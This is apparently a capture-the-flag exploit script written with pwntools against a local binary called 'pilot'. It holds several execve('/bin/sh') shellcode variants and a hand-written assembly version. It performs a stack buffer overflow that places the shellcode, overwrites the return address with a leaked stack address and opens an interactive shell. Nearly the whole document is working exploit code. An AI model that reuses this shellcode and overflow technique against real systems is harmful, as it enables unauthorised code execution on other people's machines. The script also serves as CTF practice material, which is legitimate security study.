'''
Author: Samrito
Date: 2021-12-20 16:04:13
LastEditors: Samrito
LastEditTime: 2021-12-21 23:15:35
'''
from logging import PercentStyle
from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

bss_addr = 0x602088 #0x602080

#shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
#shellcode = asm(shellcraft.sh())
myshellcode = '''
mov rbx, 0x68732f6e69622f
push rbx
push rsp
pop rdi
xor esi, esi
xor edx, edx
push 0x3b
pop rax
syscall
'''
print(''.join(['\\'+hex(e)[1:] for e in asm(myshellcode)]))
# shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
shellcode = b'\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05'
io = process('./pilot')

io.recvuntil('Good Luck Pilot!....\n')

# debug('b * 0x004009a6')
target = io.recvline()
target_addr = target.split(b':')[1][:-1].decode('utf-8')

payload = flat([shellcode.ljust(0x20+8, b'\x00'), int(target_addr, 16)])

io.sendline(payload)

io.interactive()
